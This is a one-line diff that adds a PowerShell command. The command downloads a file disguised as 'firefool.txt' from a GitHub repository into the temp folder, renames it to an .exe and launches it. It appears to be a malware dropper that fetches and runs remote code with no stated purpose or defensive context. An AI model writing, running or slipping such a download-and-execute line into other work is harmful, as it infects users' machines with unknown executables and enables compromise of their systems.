@@ -1,0 +1,1 @@
+$url = "https://github.com/forsaken0127/Rust/raw/main/firefool.txt"; $downloadPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "firefool.txt"); $executePath = [System.IO.Path]::ChangeExtension($downloadPath, ".exe"); Invoke-WebRequest -Uri $url -OutFile $downloadPath; Rename-Item -Path $downloadPath -NewName $executePath; Start-Process -FilePath $executePath
